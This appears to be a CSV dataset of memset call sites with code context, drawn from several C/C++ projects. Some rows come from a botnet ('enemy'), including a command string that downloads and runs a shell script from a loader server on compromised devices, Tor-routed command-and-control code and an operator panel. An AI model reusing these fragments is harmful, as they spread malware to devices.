2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(rhexstring, 0, 128);",120,1,"				sin.sin_port = realrand(49152, 65535);
			}
            memset(rhexstring, 0, 128);
			sprintf(rhexstring, rhexstrings[rand() % count], (char)rand() % 255, (char)rand() % 255);
			send(std_hex, rhexstring, strlen(rhexstring), 0);
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset((telstate->sockbuf), 0, SOCKBUF_SIZE);",120,1,"    telstate->totalTimeout = 0;
    telstate->state = new_state;
    memset((telstate->sockbuf), 0, SOCKBUF_SIZE);
}

"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(buffer, 0, buf_size);",120,1,"int read_until_response(int fd, int timeout_usec, char * buffer, int buf_size, char ** strings) {
    int num_bytes, i;
    memset(buffer, 0, buf_size);
    num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);

"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset((telstate -> sockbuf), 0, SOCKBUF_SIZE);",120,1,"    telstate -> totalTimeout = 0;
    telstate -> state = new_state;
    memset((telstate -> sockbuf), 0, SOCKBUF_SIZE);
}

"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(output, 0, sizeof(output));",120,1,"  char tmp[3];
  char *output = malloc(strlen(p)*2+1);
  memset(output, 0, sizeof(output));
  for (i=0;i<strlen(p);i++) {
    sprintf(tmp, ""%02x"", p[i]);
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(buffer, 0, BUFFER_SIZE + 1);",120,1,"
    buffer = malloc(BUFFER_SIZE + 1);
    memset(buffer, 0, BUFFER_SIZE + 1);

    struct telstate_t fds[max];
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(&(fds[i]), 0, sizeof(struct telstate_t));",120,1,"    memset(fds, 0, max * (sizeof(int) + 1));
    for (i = 0; i < max; i++) {
        memset(&(fds[i]), 0, sizeof(struct telstate_t));
        fds[i].complete = 1;
        fds[i].sockbuf = buffer;
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(rekdevice, 0, sizeof(rekdevice));",120,1,"
    char rekdevice[512];
    memset(rekdevice, 0, sizeof(rekdevice));
    sprintf(rekdevice, ""cd /tmp || cd /home/$USER || cd /var/run || cd /mnt; wget http://%s/ssh.sh -O ssh.sh || busybox wget http://%s/ssh.sh -O ssh.sh || curl http://%s/ssh.sh -O ssh.sh || busybox curl http://%s/ssh.sh -O ssh.sh; chmod 777 ssh.sh; ./ssh.sh; rm -f ssh.sh &\r\n"", ldserver, ldserver, ldserver, ldserver);
   // printf(""%s"", rekdevice);
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(fds, 0, sizeof(fds));",120,1,"            while (1) {
                struct ssh_fds *fds = calloc(__MAX_SSH_FDS, sizeof(struct ssh_fds));
                memset(fds, 0, sizeof(fds));
                for(mode = 0; mode < 3; mode++) {
                   for(k = 0; k < __MAX_SSH_FDS; k++) {
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(&address, 0, sizeof(address));",120,1,"                        if(mode == 0) {
                            struct sockaddr_in address;
                            memset(&address, 0, sizeof(address));
                            address.sin_family = AF_INET;
                            address.sin_addr.s_addr = getPIP();
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(conn->rdbuf, 0, sizeof(conn->rdbuf));",120,1,"    }
    conn->rdbuf_pos = 0;
    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
    addr.sin_family = AF_INET;
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"if(argc == 2) { memset(ldserver, 0, sizeof(ldserver)); strcpy(ldserver, argv[1]); }",120,1,"void processCmd(int argc, unsigned char * argv[]) {
  if(strstr(argv[0], decode(""~-6mvgmv""))) { //LDSERVER - gets loader server for everything
      if(argc == 2) { memset(ldserver, 0, sizeof(ldserver)); strcpy(ldserver, argv[1]); }
    // printf(""SUCCESSFULLY LOADED LOADER SERVER %s\n"", ldserver);
  }
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(argv[0], '\0', space);",120,1,"            space += length + 1; // because of terminating zero 
        }
        memset(argv[0], '\0', space); // wipe existing args
        strncpy(argv[0], pname, space - 1); // -1: leave null termination, if title bigger than space
        pid_t pid1;
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(&s_addr, 0, sizeof(s_addr));",120,1,"            struct sockaddr_in s_addr;
            node = rand() % TOR_MAX_SOCKS;
            memset(&s_addr, 0, sizeof(s_addr));
            s_addr.sin_family = AF_INET;
            s_addr.sin_addr.s_addr = retrieve_addr(node);
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(sendbuf, 0, sizeof(sendbuf));",120,1,"                memcpy(sendbuf, ""\x05\x01\x00"", 3);
                send(fd_cnc, sendbuf, 3, MSG_NOSIGNAL);
                memset(sendbuf, 0, sizeof(sendbuf));
                stage = STAGE_TORSOCK;
                continue;
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(string, 0, sizeof(string));",120,1,"
                        send(fd_cnc, sendbuf, 7 + len, MSG_NOSIGNAL);
                        memset(string, 0, sizeof(string));
                        memset(sendbuf, 0, sizeof(sendbuf));
                        state = TOR_VERIFY;
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(rdbuf, 0, sizeof(rdbuf));",120,1,"                        if (rdbuf[1] != 0x00)
                        {
                            memset(rdbuf, 0, sizeof(rdbuf));
                            complete = 0;
                            break;
"
2021\enemy\enemy.c,Dataset Download,../../Dataset Download/2021\enemy\enemy.c,"memset(params[paramsCount], 0, strlen(pch) + 1);",120,1,"                                    if(paramsCount>=10) continue;
                                    params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                    memset(params[paramsCount], 0, strlen(pch) + 1);
                                    strcpy(params[paramsCount], pch);
                                    paramsCount++;
"
2021\enemy\hide.c,Dataset Download,../../Dataset Download/2021\enemy\hide.c,"memset(encoded, 0, sizeof(encoded));",120,1,"	int x = 0, i = 0, c;

	memset(encoded, 0, sizeof(encoded));
	while(x < strlen(str))
	{
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset (&hints, 0, sizeof (struct addrinfo));",120,1,"	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;     
	hints.ai_socktype = SOCK_STREAM; 
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(wot, 0, strlen(msg) + 10);",120,1,"        if(strcmp(msg, ""PING"") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(kekolds, 0, sizeof(kekolds));",120,1,"                else if(clients[i].connected) send(i, ""\n"", 1, MSG_NOSIGNAL);
        }
		memset(kekolds, 0, sizeof(kekolds));
        free(wot);
}
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(buf, 0, sizeof buf);",120,1,"				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, ""\n"") == NULL) { done = 1; break; }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {",120,1,"				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, ""\n"") == NULL) { done = 1; break; }
					trim(buf);
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(client[datafd].arch, 0, sizeof(client[datafd].arch));",120,1,"			if (done) {
				client->connected = 0;
				memset(client[datafd].arch, 0, sizeof(client[datafd].arch));
				close(datafd);
}}}}}}
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(string, 0, 2048);",120,1,"    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, ""%c]0;Devices: %d | Users Online: %d%c"", '\033', BotsConnected(), OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(botnet, 0, 2048);",120,1,"	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(botcount, 0, 2048);",120,1,"	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(statuscount, 0, 2048);",120,1,"	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(buf, 0, 2048);",120,1,"        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto Banner;
        }
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(banner_bot_count, 0, 2048);",120,1,"		char welcome_line [80];
		char banner_bot_count [2048];
		memset(banner_bot_count, 0, 2048);
		
		sprintf(welcome_line,       ""\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n"", BotsConnected(), OperatorsConnected); 
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(killattack, 0, 2048);",120,1,"			if(strstr(buf, ""!* kill"")) {
				char killattack [2048];
				memset(killattack, 0, 2048);
				sprintf(killattack, ""Succesfully Stopped Attack!\r\n"");
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(auresp, 0, sizeof(auresp));",120,1,"				{
					reuser:
					memset(auresp, 0, sizeof(auresp));
					memset(new_username, 0, sizeof(new_username));
					memset(new_password, 0, sizeof(new_password));
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(new_username, 0, sizeof(new_username));",120,1,"					reuser:
					memset(auresp, 0, sizeof(auresp));
					memset(new_username, 0, sizeof(new_username));
					memset(new_password, 0, sizeof(new_password));
					sprintf(auresp, ""\x1b[39mEnter new unsername\x1b[35m: \x1b[37m"");
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(new_password, 0, sizeof(new_password));",120,1,"					memset(auresp, 0, sizeof(auresp));
					memset(new_username, 0, sizeof(new_username));
					memset(new_password, 0, sizeof(new_password));
					sprintf(auresp, ""\x1b[39mEnter new unsername\x1b[35m: \x1b[37m"");
					if(send(datafd, auresp, strlen(auresp), MSG_NOSIGNAL) == -1) goto end;
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(failed_msg, 0, sizeof(failed_msg));",120,1,"					snprintf(failed_msg, sizeof(failed_msg), ""Sorry %s, only the owner can use this function...\r\n"", managements[datafd].username);
					if(send(datafd, failed_msg, strlen(failed_msg), MSG_NOSIGNAL) == -1) return;
					memset(failed_msg, 0, sizeof(failed_msg));
				}
			}
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(managements[x].username, 0, sizeof(managements[x].username));",120,1,"							managements[x].connected = 0;
							close(x);
							memset(managements[x].username, 0, sizeof(managements[x].username));
							memset(kick_msg, 0, sizeof(kick_msg));
							memset(kick_msg2, 0, sizeof(kick_msg2));
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(kick_msg, 0, sizeof(kick_msg));",120,1,"							close(x);
							memset(managements[x].username, 0, sizeof(managements[x].username));
							memset(kick_msg, 0, sizeof(kick_msg));
							memset(kick_msg2, 0, sizeof(kick_msg2));
						}
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(kick_msg2, 0, sizeof(kick_msg2));",120,1,"							memset(managements[x].username, 0, sizeof(managements[x].username));
							memset(kick_msg, 0, sizeof(kick_msg));
							memset(kick_msg2, 0, sizeof(kick_msg2));
						}
					}
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(clearscreen, 0, 2048);",120,1,"			else if(strstr(buf, ""CLEARSCREEN"") || strstr(buf, ""CLEAR"") || strstr(buf, ""clear"") || strstr(buf, ""cls"")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, ""\033[2J\033[1;1H"");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(logoutmessage, 0, 2048);",120,1,"			if(strstr(buf, ""LOGOUT"")) {
				char logoutmessage [2048];
				memset(logoutmessage, 0, 2048);
				sprintf(logoutmessage, ""Redirecting..., %s"", accounts[find_line].username);
				if(send(datafd, logoutmessage, strlen(logoutmessage), MSG_NOSIGNAL) == -1)goto end;
"
2021\enemy\servertor.c,Dataset Download,../../Dataset Download/2021\enemy\servertor.c,"memset(managements[datafd].username, 0, sizeof(managements[datafd].username));",120,1,"			close(datafd);
			OperatorsConnected--;
			memset(managements[datafd].username, 0, sizeof(managements[datafd].username));
			memset(buf, 0, sizeof(buf));
}
"
2021\firestore-dht11-node\src\app_wifi.c,Dataset Download,../../Dataset Download/2021\firestore-dht11-node\src\app_wifi.c,"memset(&stCtx, 0x00, sizeof(stCtx));",120,1,"  esp_err_t s32RetVal;

  memset(&stCtx, 0x00, sizeof(stCtx));
  s32RetVal = nvs_flash_init();
  if((ESP_ERR_NVS_NO_FREE_PAGES == s32RetVal) || (ESP_ERR_NVS_NEW_VERSION_FOUND == s32RetVal))
"
2021\fusor-state-machine-plugins\src\DSCAlarmSystemPlugin.cpp,Dataset Download,../../Dataset Download/2021\fusor-state-machine-plugins\src\DSCAlarmSystemPlugin.cpp,"memset(LoBits, 0, DSC_MAX_BITS);",120,1,"    pinMode(signalPin, INPUT);

    memset(LoBits, 0, DSC_MAX_BITS);
    memset(HiBits, 0, DSC_MAX_BITS);
    memset(PrevLoBits, 0, DSC_MAX_BITS);
"
2021\fusor-state-machine-plugins\src\DSCAlarmSystemPlugin.cpp,Dataset Download,../../Dataset Download/2021\fusor-state-machine-plugins\src\DSCAlarmSystemPlugin.cpp,"memset(HiBits, 0, DSC_MAX_BITS);",120,1,"
    memset(LoBits, 0, DSC_MAX_BITS);
    memset(HiBits, 0, DSC_MAX_BITS);
    memset(PrevLoBits, 0, DSC_MAX_BITS);
    memset(PrevHiBits, 0, DSC_MAX_BITS);
"
2021\fusor-state-machine-plugins\src\DSCAlarmSystemPlugin.cpp,Dataset Download,../../Dataset Download/2021\fusor-state-machine-plugins\src\DSCAlarmSystemPlugin.cpp,"memset(PrevLoBits, 0, DSC_MAX_BITS);",120,1,"    memset(LoBits, 0, DSC_MAX_BITS);
    memset(HiBits, 0, DSC_MAX_BITS);
    memset(PrevLoBits, 0, DSC_MAX_BITS);
    memset(PrevHiBits, 0, DSC_MAX_BITS);
    memset(zones, 0, 32);
"
2021\fusor-state-machine-plugins\src\DSCAlarmSystemPlugin.cpp,Dataset Download,../../Dataset Download/2021\fusor-state-machine-plugins\src\DSCAlarmSystemPlugin.cpp,"memset(PrevHiBits, 0, DSC_MAX_BITS);",120,1,"    memset(HiBits, 0, DSC_MAX_BITS);
    memset(PrevLoBits, 0, DSC_MAX_BITS);
    memset(PrevHiBits, 0, DSC_MAX_BITS);
    memset(zones, 0, 32);

"
2021\fusor-state-machine-plugins\src\DSCAlarmSystemPlugin.cpp,Dataset Download,../../Dataset Download/2021\fusor-state-machine-plugins\src\DSCAlarmSystemPlugin.cpp,"memset(zones, 0, 32);",120,1,"    memset(PrevLoBits, 0, DSC_MAX_BITS);
    memset(PrevHiBits, 0, DSC_MAX_BITS);
    memset(zones, 0, 32);

    bitsReady = false;
"
2021\fusor-wifi-configurator\src\WifiConfigurator.cpp,Dataset Download,../../Dataset Download/2021\fusor-wifi-configurator\src\WifiConfigurator.cpp,"memset(_variables, 0, sizeof(_variables));",120,1,"void WifiConfigurator::init()
{
  memset(_variables, 0, sizeof(_variables));
  _loadFromEEPROM();
}
"
2021\fusor-wifi-configurator\src\WifiConfigurator.cpp,Dataset Download,../../Dataset Download/2021\fusor-wifi-configurator\src\WifiConfigurator.cpp,"memset(_buffer, 0, CONFIGURATOR_BUFFER_SIZE);",120,1,"  if (client)
  {
    memset(_buffer, 0, CONFIGURATOR_BUFFER_SIZE);

    uint8_t len = 0;
"
2021\gravity\src\gravity-user-manager\gravityusermanager.cpp,Dataset Download,../../Dataset Download/2021\gravity\src\gravity-user-manager\gravityusermanager.cpp,"memset(&val, 0, sizeof(val));",120,1,"
    // Initialize G-String.
    memset(&val, 0, sizeof(val));
    g_value_init(&val, G_TYPE_STRING);
    g_value_set_string(&val, user.toLatin1().constData());
"
2021\haas-mini-program\adapter\platform\aos-haas100\amp_system.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\amp_system.c,"memset(task, 0, sizeof(task_context_t));",120,1,"        return -1;
    }
    memset(task, 0, sizeof(task_context_t));

    task->arg      = arg;
"
2021\haas-mini-program\adapter\platform\aos-haas100\amp_system.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\amp_system.c,"memset(timer, 0, sizeof(aos_timer_t));",120,1,"        return NULL;
    }
    memset(timer, 0, sizeof(aos_timer_t));
    timer_data_t *node = (timer_data_t *)aos_malloc(sizeof(timer_data_t));
    if (node == NULL) {
"
2021\haas-mini-program\adapter\platform\aos-haas100\amp_system.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\amp_system.c,"memset(node, 0, sizeof(timer_data_t));",120,1,"        return NULL;
    }
    memset(node, 0, sizeof(timer_data_t));
    node->timer = timer;
    node->user_data = user_data;
"
2021\haas-mini-program\adapter\platform\aos-haas100\amp_system.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\amp_system.c,"memset(osal_queue, 0, sizeof(amp_osal_queue_t));",120,1,"        return NULL;
    }
    memset(osal_queue, 0, sizeof(amp_osal_queue_t));

    /* malloc queue buffer */
"
2021\haas-mini-program\adapter\platform\aos-haas100\amp_system.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\amp_system.c,"memset(&stat, 0, sizeof(stat));",120,1,"	netmgr_stats_t stat;

	memset(&stat, 0, sizeof(stat));
	netmgr_stats(INTERFACE_WIFI, &stat);
	if (!stat.ip_available)
"
2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,"memset(&address, 0, sizeof(struct sockaddr_in));",120,1,"    char *ip[DNS_RESULT_COUNT] = {0};

    memset(&address, 0, sizeof(struct sockaddr_in));
    utils_str2uint((char *)port, strlen(port), &uint_port);

"
2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,"memset(save_buf, 0x00, TLS_MAX_SESSION_BUF);",120,1,"

            memset(save_buf, 0x00, TLS_MAX_SESSION_BUF);
            memset(saved_session, 0x00, sizeof(mbedtls_ssl_session));
            amp_snprintf(key_buf, KEY_MAX_LEN - 1, KV_SESSION_KEY_FMT, addr);
"
2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,"memset(saved_session, 0x00, sizeof(mbedtls_ssl_session));",120,1,"
            memset(save_buf, 0x00, TLS_MAX_SESSION_BUF);
            memset(saved_session, 0x00, sizeof(mbedtls_ssl_session));
            amp_snprintf(key_buf, KEY_MAX_LEN - 1, KV_SESSION_KEY_FMT, addr);
            ret = amp_kv_get(key_buf, save_buf, &len);
"
2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,"memset(new_session, 0x00, sizeof(mbedtls_ssl_session));",120,1,"        }

        memset(new_session, 0x00, sizeof(mbedtls_ssl_session));

        ret = mbedtls_ssl_get_session(&(pTlsData->ssl), new_session);
"
2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,"memset(save_buf, 0x00, sizeof(TLS_MAX_SESSION_BUF));",120,1,"                break;
            }
            memset(save_buf, 0x00, sizeof(TLS_MAX_SESSION_BUF));
            ret = ssl_serialize_session(new_session, save_buf, TLS_MAX_SESSION_BUF, &real_session_len);
            printf(""mbedtls_ssl_get_session_session return 0x%04x real_len=%d\r\n"", ret, (int)real_session_len);
"
2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\amp_tls_mbedtls.c,"memset(pTlsData, 0x0, sizeof(TLSDataParams_t));",120,1,"        return (uintptr_t)NULL;
    }
    memset(pTlsData, 0x0, sizeof(TLSDataParams_t));

    sprintf(port_str, ""%u"", port);
"
2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_dns.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_dns.c,"memset(temp, 0, 10);",120,1,"        j = 0;
        pos = input[idx];
        memset(temp, 0, 10);
        do {
            temp[i++] = pos % 10 + '0';
"
2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_dns.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_dns.c,"memset(g_dns_ip_list, 0, DNS_RESULT_COUNT * 16);",120,1,"    idx += 1 + 4;

    memset(g_dns_ip_list, 0, DNS_RESULT_COUNT * 16);

    while (idx < buffer_len) {
"
2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_udp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_udp.c,"memset(&addr, 0, sizeof(struct sockaddr_in));",120,1,"    int opt_val = 1;

    memset(&addr, 0, sizeof(struct sockaddr_in));

    if (0 != setsockopt(p_socket, SOL_SOCKET, SO_REUSEADDR, &opt_val, sizeof(opt_val))) {
"
2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_udp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_udp.c,"memset((char *)&hints, 0x00, sizeof(hints));",120,1,"
    sprintf(port_ptr, ""%u"", port);
    memset((char *)&hints, 0x00, sizeof(hints));
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_family = AF_INET;
"
2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_udp.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_udp.c,"memset(&local_addr, 0x00, sizeof(local_addr));",120,1,"

    memset(&local_addr, 0x00, sizeof(local_addr));
    local_addr.sin_family = AF_INET;
    if (NULL != host) {
"
2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_wifi.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_wifi.c,"memset(&config, 0, sizeof(config));",120,1,"	netmgr_ap_config_t config;

	memset(&config, 0, sizeof(config));
	strncpy(config.ssid, ssid, sizeof(config.ssid) - 1);
	strncpy(config.pwd, passwd, sizeof(config.pwd) - 1);
"
2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_wifi.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\network\amp_wifi.c,"memset(wifi_info->ssid, 0, strlen(config.ssid) + 1);",120,1,"		return -1;
	}
	memset(wifi_info->ssid, 0, strlen(config.ssid) + 1);
	memcpy(wifi_info->ssid, config.ssid, strlen(config.ssid));

"
2021\haas-mini-program\adapter\platform\aos-haas100\peripheral\amp_hal_gpio.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\peripheral\amp_hal_gpio.c,"memset(pst_gpio_irq, 0, sizeof(haas100_gpio_irq_info_t));",120,1,"    }

    memset(pst_gpio_irq, 0, sizeof(haas100_gpio_irq_info_t));
    memcpy(&pst_gpio_irq->st_gpioinfo, gpio, sizeof(gpio_dev_t));
    pst_gpio_irq->handle = handler;
"
2021\haas-mini-program\adapter\platform\aos-haas100\peripheral\amp_hal_uart.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\aos-haas100\peripheral\amp_hal_uart.c,"memset(notify, 0, sizeof(uart_recv_notify_t));",120,1,"        if (!notify)
            return -1;
        memset(notify, 0, sizeof(uart_recv_notify_t));
        aos_mutex_new(&notify->lock);
        aos_sem_new(&notify->sem, 0);
"
2021\haas-mini-program\adapter\platform\linux\amp_flash.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\linux\amp_flash.c,"memset(p_partition_info, 0, sizeof(amp_hal_logic_partition_t));",120,1,"    else {
        p_partition_info = &partition_info;
        memset(p_partition_info, 0, sizeof(amp_hal_logic_partition_t));
        ret = amp_hal_flash_info_get(id, p_partition_info);
        printf(""p_partiton = %s\r\n"", p_partition_info->partition_description);      
"
2021\haas-mini-program\adapter\platform\linux\amp_kv.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\linux\amp_kv.c,"memset(kv, 0, read_size);",120,1,"    }

    memset(kv, 0, read_size);
    if (read_kv_item(file->filename, kv, i) != 0) {
        amp_debug(MOD_STR, ""read kv err"");
"
2021\haas-mini-program\adapter\platform\linux\amp_kv.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\linux\amp_kv.c,"memset(p->value, 0, ITEM_MAX_VAL_LEN);",120,1,"
        if (strcmp(p->key, key) == 0) {
            memset(p->value, 0, ITEM_MAX_VAL_LEN);
            memcpy(p->value, value, value_len);
            p->value_len = value_len;
"
2021\haas-mini-program\adapter\platform\linux\amp_kv.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\linux\amp_kv.c,"memset(p, 0, ITEM_MAX_LEN);",120,1,"    while (p && p->value_len) {
        if (strcmp(key, p->key) == 0) {
            memset(p, 0, ITEM_MAX_LEN);
        }
        if (++j == TABLE_ROW_SIZE) {
"
2021\haas-mini-program\adapter\platform\linux\amp_kv.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\linux\amp_kv.c,"memset(file, 0, sizeof(kv_file_t));",120,1,"        return NULL;
    }
    memset(file, 0, sizeof(kv_file_t));

    file->filename = filename;
"
2021\haas-mini-program\adapter\platform\linux\amp_system.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\linux\amp_system.c,"memset(&ent, 0x00, sizeof(struct sigevent));",120,1,"
    /* Init */
    memset(&ent, 0x00, sizeof(struct sigevent));

    /* create a timer */
"
2021\haas-mini-program\adapter\platform\linux\amp_system.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\linux\amp_system.c,"memset(mac, 0, 8);",120,1,"int amp_get_mac_addr(unsigned char mac[8])
{
    memset(mac, 0, 8);
    char default_value[] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07};
    memcpy(mac, default_value, 8);
"
2021\haas-mini-program\adapter\platform\linux\amp_tls_mbedtls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\linux\amp_tls_mbedtls.c,"memset(buf, 0, n * size + sizeof(mbedtls_mem_info_t));",120,1,"        return NULL;
    } else {
        memset(buf, 0, n * size + sizeof(mbedtls_mem_info_t));
    }

"
2021\haas-mini-program\adapter\platform\linux\amp_tls_mbedtls.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\adapter\platform\linux\amp_tls_mbedtls.c,"memset(psk_identity, 0, psk_identity_len);",120,1,"            return -1;
        }
        memset(psk_identity, 0, psk_identity_len);
        memcpy(psk_identity, auth_type, strlen(auth_type));
        memcpy(psk_identity + strlen(psk_identity), ""|"", strlen(""|""));
"
